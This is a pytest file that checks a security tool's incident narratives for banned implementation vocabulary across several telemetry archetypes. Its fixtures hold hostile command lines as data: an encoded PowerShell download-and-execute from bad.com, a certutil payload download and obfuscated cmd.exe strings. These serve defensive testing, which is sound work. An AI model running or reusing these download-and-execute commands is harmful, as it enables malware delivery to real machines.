"""Narrative Contract Test — permanent lexicon guardrail across every
customer-facing narrative surface **and** every telemetry archetype.

Operator directive (2026-08-01):

    The Narrative Engine is prohibited from describing how X-Lab
    performed the investigation. The subject of every paragraph must
    be the incident / endpoint / user / malware / attacker — never
    the tool.

Operator addendum (2026-08-01, second round):

    Evolve the contract into a parameterised suite that runs against
    several archetypes so the invariants hold across every
    telemetry source we ingest.

Surfaces inspected (all fields the frontend actually renders):

    * cio.summary.analyst_narrative        (Executive lens LEAD block)
    * cio.summary.executive                (Executive Summary card)
    * cio.summary.analyst                  (Analyst Report card)
    * cio.summary.technical                (Technical Report card)
    * cio.summary.attack_story             (Attack Story card)
    * cio.summary.report_sections.*        (Six-question analyst narrative)
    * cio.summary.customer_report.sections[*].body (Customer / Investigation Report)

Archetypes covered:

    1. Cisco Secure Endpoint MDR (WasabiSeed / CaretCommandObfuscation)
    2. Sysmon EventID-1 process create with parent chain
    3. Obfuscated PowerShell (`-EncodedCommand …`)
    4. Generic JSON (unknown vendor fallback)
    5. Benign administrative activity (`Get-Process` etc.)

For every archetype the four contract assertions run:

    A. No forbidden implementation-detail word appears anywhere.
    B. No vendor-canonical representation bleeds into any surface.
    C. Positive control: at least one real fact from the archetype
       makes it into the narrative (proves the graph propagated).
    D. Subject-of-first-sentence is the incident, never the tool.
"""
from __future__ import annotations

import json
import re
from typing import Iterable, List, Tuple

import pytest

from nivxforge.cim.fact_substrate import from_analysis_result
from nivxforge.investigation.builder import build_cio
from nivxforge.investigation.summary_composer import compose_summary


# ══════════════════════════════════════════════════════════════════
# Archetypes
# ══════════════════════════════════════════════════════════════════

# 1 · Cisco Secure Endpoint MDR (WasabiSeed / CaretCommandObfuscation)
CISCO_WASABISEED = json.dumps({
    "_time": "2026-07-30T16:30:22.000+00:00",
    "action": "detect",
    "category": "Cloud IOC",
    "command_line_args": (
        "C:\\windows\\system32\\cmd.exe /c s^t^a^r^t  /min for /f delims=@ "
        "%\u0441 in (',f^^i^^n^^g^^e^^r TVJLctGEMd@homesreceplestud.com') do %\u0441"
    ),
    "conn_guid": "79ed08f3-9018-44d5-9f58-254a748e6b86",
    "console_link": "https://console.amp.cisco.com/computers/79ed08f3-9018-44d5-9f58-254a748e6b86/trajectory2",
    "date": "2026-07-30 16:23:13 UTC",
    "detection": "W32.CaretCommandObfuscation.ioc",
    "event_title": "Suspicious Command Line Activity - W32.CaretCommandObfuscation.ioc",
    "file_hash": "badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0",
    "file_name": "cmd.exe",
    "file_path": "file:///C%3A/windows/system32/cmd.exe",
    "id": "1161464290877918403",
    "mitre_tactics": ["TA0002 - Execution", "TA0005 - Defense Evasion"],
    "mitre_techniques": [
        "T1027 - Obfuscated Files or Information",
        "T1059 - Command and Scripting Interpreter",
    ],
    "parent_file_hash": "988A56D897915315EEF9CA679B3BC8ADFCECF5E227AEA99AAA1817620520E97E",
    "severity": "Medium",
    "src_data": [{"hostname": ["CCM-MJ0DR5T8"], "ip": ["172.17.60.74"]}],
    "src_host": "CCM-MJ0DR5T8",
    "src_ip": "172.17.60.74",
    "use_case": "mdr_fileless",
    "z_product": "Secure Endpoint",
    "containment": "isolated",
})

# 2 · Sysmon EventID-1 process create with parent chain
SYSMON_PROCESS_CREATE = json.dumps({
    "EventID": 1,
    "Computer": "WORKSTATION-42",
    "User": "CORP\\alice",
    "Image": "C:/Windows/System32/cmd.exe",
    "OriginalFileName": "cmd.exe",
    "CommandLine": "cmd.exe /c whoami && netstat -ano",
    "ParentImage": "C:/Windows/explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ProcessId": 5678,
    "ParentProcessId": 100,
    "ProcessGuid": "{sysmon-guid}",
    "Hashes": "SHA256=" + "d" * 64 + ",MD5=" + "e" * 32,
    "IntegrityLevel": "Medium",
    "UtcTime": "2026-07-30 16:23:13.100",
})

# 3 · Obfuscated PowerShell (encoded, decodes to IEX WebClient download)
OBFUSCATED_POWERSHELL = (
    "powershell.exe -EncodedCommand "
    "SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAu"
    "AE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGE"
    "AZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBiAGEAZAAuAGMAbw"
    "BtAC8AcAAxACcAKQAp"
)

# 4 · Generic JSON — no vendor markers, unknown shape.
GENERIC_JSON = json.dumps({
    "widget_id": "w-42",
    "message": "unknown activity",
    "cmdLine": "certutil -urlcache -f http://payload.example/x.exe C:\\x.exe",
    "meta": {"env": "prod"},
})

# 5 · Microsoft Defender for Endpoint (Advanced Hunting DeviceAlertEvents)
MICROSOFT_DEFENDER = json.dumps({
    "AlertId": "da637-abc",
    "AlertTitle": "Suspicious command line launched cmd.exe",
    "AlertSeverity": "High",
    "Category": "Execution",
    "ThreatFamilyName": "Trojan:Win32/Emotet",
    "DeviceName": "FIN-LAPTOP-07",
    "DeviceId": "abc123def456",
    "AccountName": "jsmith",
    "AccountDomain": "CORP",
    "FileName": "invoice.doc.exe",
    "FolderPath": "C:\\Users\\jsmith\\Downloads",
    "SHA256": "f" * 64,
    "InitiatingProcessCommandLine": "\"cmd.exe\" /c powershell -nop -w hidden -c IEX",
    "InitiatingProcessFileName": "cmd.exe",
    "InitiatingProcessFolderPath": "C:\\Windows\\System32",
    "InitiatingProcessSHA256": "a" * 64,
    "InitiatingProcessParentFileName": "outlook.exe",
    "InitiatingProcessParentCommandLine": "\"outlook.exe\"",
    "RemoteUrl": "http://payload.example.net/stage1",
    "RemoteIP": "203.0.113.42",
    "MitreTechniques": ["T1204.002", "T1059.001"],
    "MitreTactics": ["Execution", "Initial Access"],
    "Timestamp": "2026-08-01T14:22:00Z",
    "RemediationStatus": "Blocked",
})

# 6 · Benign administrative activity — no malicious signal.
BENIGN_ADMIN = "powershell -c \"Get-Process | Select-Object Name,Id\""


ARCHETYPES: Tuple[Tuple[str, str, Tuple[str, ...]], ...] = (
    (
        "cisco_secure_endpoint",
        CISCO_WASABISEED,
        ("Cisco Secure Endpoint", "CCM-MJ0DR5T8",
         "W32.CaretCommandObfuscation.ioc", "T1027", "T1059"),
    ),
    (
        "sysmon_process_create",
        SYSMON_PROCESS_CREATE,
        ("WORKSTATION-42", "alice", "cmd.exe"),
    ),
    (
        "obfuscated_powershell",
        OBFUSCATED_POWERSHELL,
        ("bad.com",),
    ),
    (
        "generic_json",
        GENERIC_JSON,
        ("certutil", "payload.example"),
    ),
    (
        "microsoft_defender",
        MICROSOFT_DEFENDER,
        ("Microsoft Defender", "FIN-LAPTOP-07",
         "Suspicious command line"),
    ),
    (
        "benign_admin",
        BENIGN_ADMIN,
        (),
    ),
)


# ══════════════════════════════════════════════════════════════════
# Forbidden lexicon (operator-locked)
# ══════════════════════════════════════════════════════════════════

_FORBIDDEN_WORDS: Tuple[str, ...] = (
    "pipeline",
    "recursive decoder",
    "decoder",
    "verdict engine",
    "graph builder",
    "parser",
    "codec",
    "summary composer",
    "operation history",
    "decoder pass",
    "decode chain",
    "layer count",
    "normaliser",
    "normalizer",
)

_FORBIDDEN_PHRASES: Tuple[str, ...] = (
    r"\bgeneric\s+json\s+raised\b",
    r"#\s*vendor\s*=",
    r"\bcisco:amp:event\b",
    r"recovered\s+content\s+reaches\s+out\s+to\s+file://",
    r"the\s+underlying\s+command\s+resolved\s+to",
    r"the\s+recursive\s+encoding\s+demonstrates",
    r"the\s+investigation\s+routed",
    r"after\s+\d+\s+decoder\s+passes",
)

_BAD_FIRST_SENTENCE_SUBJECTS: Tuple[str, ...] = (
    "the pipeline",
    "the decoder",
    "the parser",
    "the analysis engine",
    "the summary composer",
    "the graph builder",
    "the investigation routed",
    "the decoded output",
    "the recursive decoder",
    "the recovered content",
    "the recovered command",
    "the recovered payload",
    "generic json raised",
    "the submission triggered",
)


# ══════════════════════════════════════════════════════════════════
# Fixture: build a real CIO end-to-end for a given archetype
# ══════════════════════════════════════════════════════════════════

@pytest.fixture
def archetype_summary(request):
    """Parameterised fixture — builds a real Summary for the given
    archetype payload, exactly like the /api/decode/smart router
    does (stashes `metadata.raw_input`, then invalidates phase1
    caches, then re-composes the summary)."""
    _name, payload, _facts = request.param
    fake_result = {"output": payload, "iocs": {}, "engine": "test"}
    cio_fs = from_analysis_result(
        fake_result, input_text=payload,
        source_endpoint="/api/decode/smart",
    )
    cio = build_cio(cio_fs)
    cio.metadata["raw_input"] = payload
    cio.metadata.pop("phase1_state", None)
    cio.metadata.pop("phase1_narrative", None)
    cio.summary = compose_summary(cio)
    return _name, cio.summary, _facts


def _iter_narrative_surfaces(summary) -> Iterable[Tuple[str, str]]:
    """Yield (surface_name, body) tuples for every customer-facing
    narrative field the frontend can render."""
    if summary.analyst_narrative:
        yield ("summary.analyst_narrative", summary.analyst_narrative)
    if summary.executive:
        yield ("summary.executive", summary.executive)
    if summary.analyst:
        yield ("summary.analyst", summary.analyst)
    if summary.technical:
        yield ("summary.technical", summary.technical)
    if summary.attack_story:
        yield ("summary.attack_story", summary.attack_story)

    rs = summary.report_sections
    if rs is not None:
        for field_name in ("what_happened", "what_we_found",
                            "what_we_dont_know", "what_to_do"):
            body = getattr(rs, field_name, None)
            if body:
                yield (f"summary.report_sections.{field_name}", body)

    cr = summary.customer_report or {}
    for i, sec in enumerate(cr.get("sections") or []):
        title = sec.get("title") or f"section_{i}"
        body = sec.get("body") or ""
        if body:
            yield (f"summary.customer_report[{title}]", body)


# ══════════════════════════════════════════════════════════════════
# Parameterised contract assertions
# ══════════════════════════════════════════════════════════════════

@pytest.mark.parametrize(
    "archetype_summary",
    ARCHETYPES,
    indirect=True,
    ids=[a[0] for a in ARCHETYPES],
)
def test_narrative_free_of_forbidden_words(archetype_summary):
    """A · No customer-facing narrative field may contain the banned
    implementation-detail vocabulary — for ANY archetype."""
    name, summary, _facts = archetype_summary
    violations: List[str] = []
    for surface, body in _iter_narrative_surfaces(summary):
        low = body.lower()
        for term in _FORBIDDEN_WORDS:
            if re.search(rf"\b{re.escape(term)}\b", low):
                idx = low.find(term)
                snippet = low[max(0, idx - 40):idx + len(term) + 40]
                violations.append(
                    f"[{name} · {surface}] '{term}' — '...{snippet}...'"
                )
    assert not violations, (
        f"forbidden implementation-detail terms in `{name}` archetype:\n\n"
        + "\n\n".join(violations)
    )


@pytest.mark.parametrize(
    "archetype_summary",
    ARCHETYPES,
    indirect=True,
    ids=[a[0] for a in ARCHETYPES],
)
def test_narrative_no_vendor_canonical_bleed(archetype_summary):
    """B · The `# vendor=…` / `cisco:amp:event` / `Generic JSON raised`
    canonical bleeds must never appear in any surface — for ANY
    archetype."""
    name, summary, _facts = archetype_summary
    violations: List[str] = []
    for surface, body in _iter_narrative_surfaces(summary):
        for pattern in _FORBIDDEN_PHRASES:
            m = re.search(pattern, body, re.IGNORECASE)
            if m:
                start = max(0, m.start() - 40)
                end = min(len(body), m.end() + 40)
                violations.append(
                    f"[{name} · {surface}] /{pattern}/ ⇒ '...{body[start:end]}...'"
                )
    assert not violations, (
        f"forbidden phrases in `{name}` archetype:\n\n"
        + "\n\n".join(violations)
    )


@pytest.mark.parametrize(
    "archetype_summary",
    ARCHETYPES,
    indirect=True,
    ids=[a[0] for a in ARCHETYPES],
)
def test_narrative_positive_facts_present(archetype_summary):
    """C · Positive control · at least one real fact from the archetype
    must reach the narrative surfaces. Proves the graph propagated —
    protects against tests passing on empty prose."""
    name, summary, facts = archetype_summary
    if not facts:
        # Benign / thin archetypes have no required facts.
        return
    combined = "\n".join(
        body for _, body in _iter_narrative_surfaces(summary)
    ).lower()
    missing = [f for f in facts if f.lower() not in combined]
    # Allow up to ONE fact to be missing — some archetypes surface
    # different subsets of facts through different code paths. But
    # requiring "most" facts present catches the "empty narrative"
    # regression.
    assert len(missing) <= max(0, len(facts) // 2), (
        f"[{name}] narrative did not surface the following facts: "
        f"{missing}\n\ncombined narrative preview:\n{combined[:1500]}"
    )


@pytest.mark.parametrize(
    "archetype_summary",
    ARCHETYPES,
    indirect=True,
    ids=[a[0] for a in ARCHETYPES],
)
def test_narrative_first_sentence_subject_is_the_incident(archetype_summary):
    """D · Every non-empty surface's opening sentence must talk about
    the incident / endpoint / vendor / malware / attacker / process /
    network / user — NEVER the tool. For ANY archetype."""
    name, summary, _facts = archetype_summary
    violations: List[str] = []
    for surface, body in _iter_narrative_surfaces(summary):
        first = body.strip().split(".", 1)[0].strip().lower()
        if not first:
            continue
        for bad in _BAD_FIRST_SENTENCE_SUBJECTS:
            if bad in first:
                violations.append(
                    f"[{name} · {surface}] starts with tool-subject "
                    f"'{bad}':\n  '{first[:180]}'"
                )
    assert not violations, (
        f"tool-as-subject regressions in `{name}` archetype:\n\n"
        + "\n\n".join(violations)
    )
